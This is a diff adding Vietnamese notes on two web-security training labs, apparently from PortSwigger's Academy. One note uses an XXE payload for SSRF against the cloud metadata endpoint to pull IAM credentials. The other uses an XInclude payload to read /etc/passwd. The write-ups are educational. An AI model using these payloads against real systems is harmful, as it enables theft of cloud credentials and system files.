@@ -67,6 +67,60 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
 - `Framework` cố map `<productId>` vào thuộc tính **int** productId hoặc **Long** productId của class `StockCheckRequest`.
 - Chuyển đổi chuỗi `"1;root:x:0:0:..."` sang số nguyên thất bại => ứng dụng trả lỗi là nội dung chuyển đổi về cho người dùng
 
+### Lab: Exploiting XXE to perform SSRF attacks
+- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
+- Gửi request **check stock** đến **Repeater**
+- Thay đổi payload thành:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
+]>
+<stockCheck>
+    <productId>1; &xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+
+```text
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
+```
+- Đây là một địa chỉ IP được sử dụng bởi các nhà cung cấp dịch vụ đám mây, chẳng hạn như **AWS**, **Azure** và **Google Cloud**, để cung cấp siêu dữ liệu về các trường hợp.
+
+### Lab: Exploiting XInclude to retrieve files
+#### Analysis
+- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
+- Quan sát body, ta chỉ thấy `productId=1&storeId=1`, không thể thao túng **DOCTYPE** được:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root_element [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root_element>
+    <data>content here</data>
+</root_element>
+```
+- Quy tắc vị trí **DOCTYPE**:
+    - Sau **XML declaration** `(<?xml version="1.0"?>)`
+    - Trước **root element**
+    - Không thể đặt ở giữa hoặc cuối **document**
+- Ý tưởng: Không cần thao túng **DOCTYPE**, sử dụng **XInclude** là một phần của **XML specification** cho phép xây dựng **XML document** từ các **sub-documents**.
+
+#### Exploit
+- Gửi request **check stock** đến **Repeater**
+- Thay đổi payload thành:
+
+```xml
+productId=1;<xi:include parse="text" href="/etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>&storeId=1
+```
+- `xmlns:xi="http://www.w3.org/2001/XInclude"`: Khai báo **XInclude namespace**
+- `xi:include`: Element để **include** file
+- `parse="text"`: **Parse** nội dung như **plain text**
+    - Mặc định `parse="xml"`
+    - `/etc/paswd` ở dạng **text** nên chuyển `parse="text"` để đọc
+- `href="/etc/passwd"`: Đường dẫn đến **file** cần đọc
 
 ---
 Goodluck! 🍀🍀🍀 
